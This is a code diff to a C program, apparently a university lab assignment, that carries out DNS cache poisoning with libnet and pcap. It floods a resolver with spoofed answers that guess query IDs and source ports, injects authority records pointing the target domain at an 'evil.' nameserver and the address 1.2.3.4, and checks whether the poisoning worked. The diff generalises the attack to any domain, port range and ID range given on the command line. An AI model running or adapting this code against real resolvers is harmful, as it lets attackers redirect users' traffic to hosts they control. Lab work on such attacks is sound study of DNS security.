@@ -112,7 +112,7 @@ struct Pcap makePcap() {
 		exit(EXIT_FAILURE);
 	}
 	if (pcap_setfilter(pcap.handle, &filterExpression) == -1) {
-		fprintf(stderr, "Couldn't add filter '%s' to pcap.handle: %s\n", filterExpressionString, pcap_geterr(pcap.handle));
+		fprintf(stderr, "Couldn't add filter '%s' to pcap handle: %s\n", filterExpressionString, pcap_geterr(pcap.handle));
 		exit(EXIT_FAILURE);
 	}
 
@@ -192,10 +192,11 @@ void printSpoofedIp(uchar_t* qname, char* pattern, struct Packet packet) {
 	printf("\n");
 }
 
-void partOne(int argc, char* argv[]) {
+void partOne(uint16_t resolverPort, uint16_t qid) {
 	struct Pcap pcap = makePcap();
 	struct BaseRequestOptions baseRequestOptions;
 	struct StringBaseRequestOptions query;
+
 	char* qname = { "abominable.vu.nl" };
 
 	baseRequestOptions.queryID = 1200;
@@ -207,9 +208,9 @@ void partOne(int argc, char* argv[]) {
 	query.base = baseRequestOptions;
 	struct DNSQueryRequest queryRequest = makeDNSQueryRequest(query);
 	query.sourceIP = "192.168.10.30";
-	query.base.destinationPort = 12100;
+	query.base.destinationPort = resolverPort;
 	query.base.sourcePort = 53;
-	query.base.queryID = 300;
+	query.base.queryID = qid;
 	struct DNSAnswerRequest answerRequest = makeDNSAnswerRequest(query);
 	uint16_t end = 100;
 	for (int i = 0; i < end; i++) {
@@ -229,7 +230,7 @@ void partOne(int argc, char* argv[]) {
 	return;
 }
 
-void partTwo(int argc, char* argv[]) {
+void partTwo(uint16_t resolverPort, uint16_t qidStart, uint16_t qidEnd) {
 	char* qname = { "missing.vu.nl" };
 	struct Pcap pcap = makePcap();
 	struct BaseRequestOptions baseRequestOptions;
@@ -243,16 +244,16 @@ void partTwo(int argc, char* argv[]) {
 	query.base = baseRequestOptions;
 	struct DNSQueryRequest queryRequest = makeDNSQueryRequest(query);
 	query.sourceIP = "192.168.10.30";
-	query.base.destinationPort = 12100;
+	query.base.destinationPort = resolverPort /*12100*/;
 	query.base.sourcePort = 53;
 	struct DNSAnswerRequest answerRequest = makeDNSAnswerRequest(query);
-	uint16_t end = 65535;
-	uint16_t beginning = 200;
+	// uint16_t qidEnd = 65535;
+	// uint16_t qidBeginnning = 200;
 	for (int i = 0; i < 10000; i++) {
 		for (int j = 0; j < 100; j++) {
 			libnet_write(queryRequest.base.libnet.context);
 			for (int j = 0; j < 20; j++) {
-				answerRequest.dnsHeaderOptions.queryID = (rand() % (end - beginning)) + beginning;
+				answerRequest.dnsHeaderOptions.queryID = (rand() % (qidEnd - qidStart)) + qidStart;
 				answerRequest.dnsHeaderOptions.ptag = answerRequest.base.headers.DNSHeaderPtag;
 				makeDNSHeader(answerRequest.dnsHeaderOptions);
 				libnet_write(answerRequest.base.libnet.context);
@@ -271,8 +272,11 @@ void partTwo(int argc, char* argv[]) {
 	return;
 }
 
-void partThree(int argc, char* argv[]) {
-	char* qname = { "bad.vu.nl" };
+void partThree(uint16_t resolverPort, uint16_t qidStart, uint16_t qidEnd, char * domain) {
+
+	char qname[64] = { "bad." };
+	strcat(qname, domain);
+
 	struct Pcap pcap = makePcap();
 	struct BaseRequestOptions baseRequestOptions;
 	struct StringBaseRequestOptions query;
@@ -284,19 +288,20 @@ void partThree(int argc, char* argv[]) {
 	query.sourceIP = "192.168.10.20";
 	query.destinationIP = "192.168.10.10";
 	query.base = baseRequestOptions;
+	query.domain = domain;
 	struct DNSQueryRequest queryRequest = makeDNSQueryRequest(query);
 	query.sourceIP = "192.168.10.30";
 	query.base.queryID = 300; // Test
-	query.base.destinationPort = 12100;
+	query.base.destinationPort = resolverPort;
 	query.base.sourcePort = 53;
 	struct DNSAuthRequest authRequest = makeDNSAnswerAuthRequest(query);
-	uint16_t qidEnd = 65535;
-	uint16_t qidBeginning = 200;
-	while (1) {
+	// uint16_t qidEnd = 65535;
+	// uint16_t qidStart = 200;
+	for (int i = 0; i < 15000; i++) {
 		for (int j = 0; j < 100; j++) {
 			libnet_write(queryRequest.base.libnet.context);
 			for (int j = 0; j < 20; j++) {
-				authRequest.answerRequest.dnsHeaderOptions.queryID = (rand() % (qidEnd - qidBeginning)) + qidBeginning;
+				authRequest.answerRequest.dnsHeaderOptions.queryID = (rand() % (qidEnd - qidStart)) + qidStart;
 				authRequest.answerRequest.dnsHeaderOptions.ptag = authRequest.answerRequest.base.headers.DNSHeaderPtag;
 				makeDNSHeader(authRequest.answerRequest.dnsHeaderOptions);
 				uint16_t c = libnet_write(authRequest.answerRequest.base.libnet.context);
@@ -313,20 +318,24 @@ void partThree(int argc, char* argv[]) {
 			destroyLibnetContext(queryRequest.base.libnet);
 			destroyLibnetContext(authRequest.answerRequest.base.libnet);
 			destroyPcap(pcap);
-			obtainOtherDomainNames();
+			obtainOtherDomainNames(domain);
 			break;
 		}
 	}
 	return;
 }
 
-void obtainOtherDomainNames() {
+void obtainOtherDomainNames(char * domain) {
 	struct Pcap pcap = makePcap();
 
 	struct BaseRequestOptions testBaseRequestOptions;
 	struct StringBaseRequestOptions testQueryOptions;
 	struct Packet packet;
-	testQueryOptions.qname = "rickroll.vu.nl";
+	char domainstoCheck[2][64] = {"rickroll.", "dancedancerevolution."};
+	for(int i = 0; i < 2; i++){
+		strcat(domainstoCheck[i], domain);
+	}
+	testQueryOptions.qname= domainstoCheck[0];
 	testBaseRequestOptions.queryID = 1200;
 	testBaseRequestOptions.sourcePort = 17012;
 	testBaseRequestOptions.destinationPort = 53;
@@ -346,7 +355,7 @@ void obtainOtherDomainNames() {
 		}
 	}
 
-	testQueryOptions.qname = "dancedancerevolution.vu.nl";
+	testQueryOptions.qname= domainstoCheck[1];
 	testQueryRequest = makeDNSQueryRequest(testQueryOptions);
 	libnet_write(testQueryRequest.base.libnet.context);
 	while (1) {
@@ -363,8 +372,9 @@ void obtainOtherDomainNames() {
 	return;
 };
 
-void partFour(int argc, char* argv[]) {
-	char* qname = "evil.vu.nl";
+void partFour(int16_t portStart, uint16_t qidStart, uint16_t qidEnd, char * domain, uint16_t portEnd) {
+	char qname[64] = "evil.";
+	strcat(qname, domain);
 	struct BaseRequestOptions baseRequestOptions;
 	struct StringBaseRequestOptions query;
 	struct Pcap pcap = makePcap();
@@ -376,24 +386,21 @@ void partFour(int argc, char* argv[]) {
 	query.sourceIP = "192.168.10.20";
 	query.destinationIP = "192.168.10.10";
 	query.base = baseRequestOptions;
+	query.domain = domain;
 	struct DNSQueryRequest queryRequest = makeDNSQueryRequest(query);
 	query.sourceIP = "192.168.10.30";
 	query.base.queryID = 300; // Test
 	query.base.destinationPort = 12000;
 	query.base.sourcePort = 53;
 	struct DNSAuthRequest authRequest = makeDNSAnswerAuthRequest(query);
-	uint16_t qidEnd = 65535;
-	uint16_t qidBeginning = 200;
-	uint16_t destinationPortEnd = 65535;
-	uint16_t destinationPortBeginning = 0;
-	while (1) {
+	for (int i = 0; i < 15000; i++) {
 		for (int j = 0; j < 100; j++) {
 			libnet_write(queryRequest.base.libnet.context);
 			for (int j = 0; j < 20; j++) {
-				authRequest.answerRequest.dnsHeaderOptions.queryID = (rand() % (qidEnd - qidBeginning)) + qidBeginning;
+				authRequest.answerRequest.dnsHeaderOptions.queryID = (rand() % (qidEnd - qidStart)) + qidStart;
 				authRequest.answerRequest.dnsHeaderOptions.ptag = authRequest.answerRequest.base.headers.DNSHeaderPtag;
 				makeDNSHeader(authRequest.answerRequest.dnsHeaderOptions);
-				authRequest.answerRequest.udpHeaderOptions.base.destinationPort = (rand() % (destinationPortEnd - destinationPortBeginning)) + destinationPortBeginning;
+				authRequest.answerRequest.udpHeaderOptions.base.destinationPort = (rand() % (portEnd - portStart)) + portStart;
 				authRequest.answerRequest.udpHeaderOptions.ptag = authRequest.answerRequest.base.headers.UDPHeaderPtag;
 				makeUDPHeader(authRequest.answerRequest.udpHeaderOptions);
 				uint16_t c = libnet_write(authRequest.answerRequest.base.libnet.context);
@@ -405,12 +412,13 @@ void partFour(int argc, char* argv[]) {
 		}
 		struct Packet packet = sniffPacket(pcap);
 		checkSuccess(packet, "\001\002\003\004");
+		checkSuccess(packet, "\b\004\002\001");
 		if (successes > 10) {
 			printSpoofedIp(qname, "\001\002\003\004", packet);
 			destroyLibnetContext(queryRequest.base.libnet);
 			destroyLibnetContext(authRequest.answerRequest.base.libnet);
 			destroyPcap(pcap);
-			obtainOtherDomainNames();
+			obtainOtherDomainNames(domain);
 			break;
 		}
 	}
@@ -421,19 +429,58 @@ int main(int argc, char* argv[]) {
 
 	srand(time(NULL));
 	short part = parseOptions(argc, argv);
+	errno = 0;
+	char * tailPtr = NULL;
+	char* arguments[6];
+	uint16_t argNum = 0;
+
+	if (argv[optind] == NULL || argv[optind + 1] == NULL) {
+		printf("Missing argument(s)\n");
+		exit(EXIT_FAILURE);
+	}
+
+	for (;optind < argc; optind += 1, argNum += 1) {
+		arguments[argNum] = argv[optind];
+	}
+
+	uint16_t portStart, qidStart, qidEnd, portEnd;
+	char * domain;
+	portStart = (uint16_t)strtol(arguments[0], &tailPtr, 10);
 	switch (part)
 	{
-	case 1:
-		partOne(argc, argv);
+	case 1:;
+		qidStart = (uint16_t)strtol(arguments[1], &tailPtr, 10);
+		if (errno) {
+			printf("Invalid argument(s)\n");
+			exit(EXIT_FAILURE);
+		}
+		partOne(portStart, qidStart);
 		break;
-	case 2:
-		partTwo(argc, argv);
+	case 2:;
+		qidStart = (uint16_t)strtol(arguments[1], &tailPtr, 10);
+		qidEnd = (uint16_t)strtol(arguments[2], &tailPtr, 10);
+		if (errno) {
+			printf("Invalid argument(s)\n");
+			exit(EXIT_FAILURE);
+		}
+		partTwo(portStart, qidStart, qidEnd);
 		break;
-	case 3:
-		partThree(argc, argv);
+	case 3:;
+		qidStart = (uint16_t)strtol(arguments[1], &tailPtr, 10);
+		qidEnd = (uint16_t)strtol(arguments[2], &tailPtr, 10);
+		domain = arguments[3];
+		if (errno) {
+			printf("Invalid argument(s)\n");
+			exit(EXIT_FAILURE);
+		}
+		partThree(portStart, qidStart, qidEnd, domain);
 		break;
 	case 4:
-		partFour(argc, argv);
+		qidStart = (uint16_t)strtol(arguments[1], &tailPtr, 10);
+		qidEnd = (uint16_t)strtol(arguments[2], &tailPtr, 10);
+		domain = arguments[3];
+		portEnd = (uint16_t)strtol(arguments[4], &tailPtr, 10);
+		partFour(portStart, qidStart, qidEnd, domain, portEnd);
 		break;
 	default:
 		break;
@@ -578,7 +625,8 @@ struct NetworkOrderedIPs parseIPs(struct Libnet libnet, char* sourceIPString, ch
 struct DNSAuthRequest makeDNSAnswerAuthRequest(struct StringBaseRequestOptions options) {
 
 	char* spoofedIp = "1.2.3.4";
-	char* evilNameServer = "evil.vu.nl";
+	char evilNameServer[128] = {"evil."};
+	strcat(evilNameServer, options.domain);
 
 	struct DNSAuthRequest authRequest;
 	struct DNSAnswerRecord domainRecordRequest[3], nameServerRecord;
@@ -600,7 +648,7 @@ struct DNSAuthRequest makeDNSAnswerAuthRequest(struct StringBaseRequestOptions o
 	nameServerRecord = makeDNSAnswerRecord(nameserverRecordOptions);
 	requestHeadersOptions.recordsSize += nameServerRecord.recordSize;
 
-	authRecordOptions.qname = "vu.nl";
+	authRecordOptions.qname = options.domain;
 	authRecordOptions.type = 2;
 	authRecordOptions.class = 1;
 	authRecordOptions.ttl = 7200;
